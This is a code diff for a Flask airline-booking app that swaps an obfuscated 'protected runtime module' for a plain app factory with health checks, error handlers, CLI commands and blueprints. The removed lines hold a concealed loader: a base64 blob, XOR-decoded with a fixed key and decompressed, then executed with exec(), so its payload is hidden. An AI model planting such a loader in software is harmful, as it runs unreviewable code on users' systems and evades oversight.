@@ -1,43 +1,140 @@
-# -*- coding: utf-8 -*-
-# ==============================================================================
-# PROTECTED RUNTIME MODULE — PROPRIETARY INTELLECTUAL PROPERTY
-# ALL RIGHTS RESERVED • REVERSE ENGINEERING PROHIBITED
-# ==============================================================================
-import zlib as _z, base64 as _b
-_k = b'\x93\xa1\x7f\xc4.[\x8a\xd0\x1fnB'
-_p = (
-    b"63vKnMU0aWgOkawsIxr7ZuGwinhxAnJ3F3mnKJGMKdXPEH9qHyt6wWTS3QZ56VVNGZN1DgY80HbGkBSF"
-    b"207EJvKF/L9jjjr+WEY3vVHtNVpSdQp6NiKjBylLsnEEExMIekAkN/+GyIEl6044CJff/p6PsUPkXE/c"
-    b"De2XNU7X4cXkiHeVX1PdCG9TxCxNHyGuLtvozQ9DaUdazr19JH/0F+1jQUGh4DMVynJDJlRhcQnSE2Y9"
-    b"Q4o6l/+vP7AOLQy2F4AeR7ruR1MdUO6PZreBtG/F8LCV0MrGdLZaRWhge5RuMyqEZSOk2TKW+0Dfb9hE"
-    b"XAmfhoONNjDCSPVEV9pPF+p74WhKo0xNuQ51iiQOw7ujcJsfgNFkSxwp1ahP/49+8Buh/JkmZhK9EtsV"
-    b"9UFsruJ0qT2LsEXoVlrA3bbZXowOT8er2rdqNMJ11xAg/m5CnfvncbiaksUTOyNAydq6iC4Xz5hlOkuU"
-    b"7sMhbfPWUYdWAdUPVkVS/sSvcgL/tiehdAg1W7eP1q8WObQUtjt2jxdsroMt3hytqAZ4phIgItN9oC2V"
-    b"KNFeue9+yWsqf8AF0CZLatlgYnImXbZC/12S2yfbbSa2/4gsFyrmv6HwyrkSlRYm0mr7h4jCmIVcEao+"
-    b"YiPKkVpsmyawOw5BtNUNjCiG4anj6pV9QvptZnBXlVI7O43hQFSIXyf1EM3uFXzjohMyhI0jRL2lOtB8"
-    b"6XiEiunX9ambhTTsXMNAxqfoeWOS6Ppl28MCAR/JuIyp3jW9R5JOLV/kLfjzPSYa9TQg1/0QOLW1xUrZ"
-    b"33RXON43NAnFeUKK92YmBh03buVnyW10Nn98A18h4yjp6P00cSHDpvsA6i4WajEAk1t7/SHTgWGwBY5s"
-    b"tRN/4flO4QuD0wpKL+lHj9kF4/MW3hsNkFgh8t9Q7hMQMXICIM4N2ZeTpsJafhdbqu78j0X7/WUC3CWs"
-    b"1Gxmzfx+lPzTR484dWJaE5gyBgcZrLOHf8w6N9/dqe6FCZ6Tue7LhdcyKpZyH1RdnsO00Tuw8sVG8WQ2"
-    b"McOVUfOu4SPnrMudgEvljQldEHmnyLuBXQsiTAlQY2SmhyDusZo9J49EHMdOj/WMJMqtod1BtZykvABY"
-    b"UuExLuGUtGd34GL9aDoObQn/TNqB0xZXuO6FizLXpcSMGAeQPB/wXpl6+u9sSBNFVSZ++JcYiDHrToOp"
-    b"ITw7xyOPIBJe9/xx5SOhDjK29yndpzT7A93KsEKyC0W7epk4KcFb3g4iS25+qcM3EqHuawCBEOiwH19Q"
-    b"gdkDcEwAwNYoIDPWbaMUHEmnez4FSKITf0UW9f4FvBUI5N6wlPZjsImfS8YVD/qTj3ceNNVaeGyWJZr5"
-    b"WNxJrxDZbxtCgd3hXpIOKboWTEmKgf1dIZ4GObWmCtlfnj0pWaBNKM47O/iOwKx7Qwnk+zhSbv/RLRPC"
-    b"Ix0a0Q+BDyMH8dZDNTyuQ2ve9ZyVysbUfupKBQD7HjtqiBAZfEpRClaBK2XlWqtKa+n7WLcOs5I5BDex"
-    b"aMlAmNJCCEW6Zcq+3URwqi54NU4sFxsYz9dXb32sWGA+e4SftpSXxjkJT+KKqevP1ZojOpWI0ML5H0fZ"
-    b"nqfl1QZ3WiETf4u91wg99it0Y+5UoH5VAzK8Ha4lEnnrGlbOS+lq3EV6dBR/Sc+VDpISvUCiolfhdcWG"
-    b"hmZ3G8cycI+g/AqtxmJqTMY0MX1F3Rb0W7BBmTRdh/Ibp+QTELRYSKnBCq/2HTROzwQXt62TtgJt8GjB"
-    b"O3IKBO9/GUx+6kPA5oY7HKAwxlnScnG2iegpXvdKERDvduGlntA1mdloEmPPeuWS6BmRpW4dT/7WLsQ+"
-    b"hhz8CB9/iPMT5+Hpkz09iljYd++wgv6egolJkp2PlM+9y4GnAh71id7M57xkXGefdnRn74lowM2Qoyd+"
-    b"ACkY6aBgGxmKLuM41BW4klkA8Q/jcJHtawi81UANUdvqbCVImD9eakzqG212WCEqH4inDF7izpdUm4vq"
-    b"NMwHVldiEN80HccT9HisYmzTjz0NIhSKhPgnh9ip0ntTNecssRjBqZuj/nqz3rISCAbxghfij93V9Z9q"
-    b"a9xIzhJo1S7GtTPfn7VarBnLvwRs4Hm0SkKWgf0OCtUC/7dOapIc4IOkHqgEnfv23hTINYI+uJJjLGyW"
-    b"e8vOUS6DHVup365PzUAQ2GaAIqsF+DkR+W7r7YkD5/m3t14mk9zglLSWG4mfrlZMf0CNiWQpYbifw2r/"
-    b"09AzILZhgRztSxsOFyUoU8/9gwtrAx/sbEY2fysbBZeoXlGgOHJ3GrMc+zJSU/Piy48xy+93NFBqUjY6"
-    b"0NRLwiUh1xUYzChYprqkwtRSBMcMzt8VeYvAuNd2lSCK6AXzApIp45tPpBltvyfV/Q24G+1eTzhqeYTy"
-    b"ZZdl01KIfV9Xt8IIA6p0zHMV8fRU2V95T9ps16poq4Zz7mbswcUusbV++fSupzqEpTJjwKKVKW2FkHw8"
-    b"2dY1zItRel7ApaSQH+g15voceYsDqZm+3hxDlHW1zm6lxU+ClI1A9kC27sKI0+Fo/OK6IckrD+sClsfn"
-    b"CxIC1A+TdZjmwrV316npLxU="
-)
-exec(_z.decompress(bytes([_c ^ _k[_i % len(_k)] for _i, _c in enumerate(_b.b64decode(_p))])).decode('utf-8'), globals())
+import os
+import datetime
+import click
+from pathlib import Path
+from flask import Flask, session, jsonify, render_template, request
+from app.config import Config
+from app import db
+
+def create_app(config_class=Config):
+    app = Flask(__name__)
+    app.config.from_object(config_class)
+
+    # Ensure parent directory for SQLite database exists (crucial for Docker / volume mounts)
+    db_path = app.config.get("DATABASE_PATH")
+    if db_path and db_path != ":memory:":
+        parent_dir = Path(db_path).parent
+        parent_dir.mkdir(parents=True, exist_ok=True)
+
+    # Initialize database hooks
+    db.init_app(app)
+
+    # Auto-seed database on first startup if tables don't exist (e.g. cold start on cloud deployment)
+    with app.app_context():
+        try:
+            db_conn = db.get_db()
+            table_check = db_conn.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='airports'").fetchone()
+            if not table_check:
+                from app.seed import seed_database
+                db.init_db()
+                seed_database()
+        except Exception:
+            pass
+
+    # Context processor to make current_user available in all templates
+    @app.context_processor
+    def inject_user():
+        from app.db import get_db
+        if 'user_id' in session:
+            try:
+                db_conn = get_db()
+                user = db_conn.execute("SELECT id, name, email, phone FROM users WHERE id = ?", (session['user_id'],)).fetchone()
+                return {'current_user': user}
+            except Exception:
+                return {'current_user': None}
+        return {'current_user': None}
+
+    # Production Security Response Headers
+    @app.after_request
+    def set_security_headers(response):
+        response.headers['X-Content-Type-Options'] = 'nosniff'
+        response.headers['X-Frame-Options'] = 'SAMEORIGIN'
+        response.headers['X-XSS-Protection'] = '1; mode=block'
+        return response
+
+    # Health Check Endpoints (for Docker, Render, Kubernetes, AWS, Railway)
+    @app.route("/health")
+    @app.route("/api/health")
+    def health_check():
+        db_status = "connected"
+        try:
+            db_conn = db.get_db()
+            db_conn.execute("SELECT 1").fetchone()
+        except Exception as e:
+            db_status = f"unhealthy: {str(e)}"
+            return jsonify({
+                "status": "degraded",
+                "service": "CloudSky Airways Flight Reservation System",
+                "database": db_status,
+                "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
+            }), 503
+
+        engine = "MongoDB" if db.is_mongo_enabled() else "SQLite"
+        return jsonify({
+            "status": "healthy",
+            "service": "CloudSky Airways Flight Reservation System",
+            "version": "1.0.0",
+            "environment": app.config.get("FLASK_ENV", "production"),
+            "database": db_status,
+            "database_engine": engine,
+            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
+        }), 200
+
+    # Production Error Handlers
+    @app.errorhandler(404)
+    def page_not_found(e):
+        if request.path.startswith("/api/"):
+            return jsonify({"error": "Resource not found", "status_code": 404}), 404
+        return render_template("errors/404.html"), 404
+
+    @app.errorhandler(500)
+    def internal_server_error(e):
+        if request.path.startswith("/api/"):
+            return jsonify({"error": "Internal server error", "status_code": 500}), 500
+        return render_template("errors/500.html"), 500
+
+    # Register custom CLI commands
+    @app.cli.command("init-db")
+    def init_db_command():
+        """Clear the existing data and create new tables."""
+        db.init_db()
+        click.echo("Initialized the database.")
+
+    @app.cli.command("seed-db")
+    def seed_db_command():
+        """Seed the database with sample airports, flights, and seats."""
+        from app.seed import seed_database
+        db.init_db()
+        seed_database()
+        click.echo("Database seeded successfully.")
+
+    @app.cli.command("list-users")
+    def list_users_command():
+        """List all registered users stored in the SQLite database."""
+        db_conn = db.get_db()
+        users = db_conn.execute("SELECT id, name, email, phone, created_at FROM users ORDER BY id ASC").fetchall()
+        if not users:
+            click.echo("No registered users found in database.")
+            return
+        click.echo(f"\nFound {len(users)} user(s) in SQLite database:")
+        click.echo("=" * 80)
+        click.echo(f"{'ID':<4} {'Name':<22} {'Gmail / Email':<32} {'Created At'}")
+        click.echo("-" * 80)
+        for u in users:
+            click.echo(f"{u['id']:<4} {u['name']:<22} {u['email']:<32} {u['created_at']}")
+        click.echo("=" * 80 + "\n")
+
+    # Apply ProxyFix so Flask trusts X-Forwarded-Proto and X-Forwarded-For from Render reverse proxy
+    from werkzeug.middleware.proxy_fix import ProxyFix
+    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
+
+    # Register Blueprints
+    from app.routes.main import main_bp
+    from app.routes.api import api_bp
+    from app.routes.auth import auth_bp
+
+    app.register_blueprint(main_bp)
+    app.register_blueprint(auth_bp)
+    app.register_blueprint(api_bp, url_prefix="/api")
+
+    return app
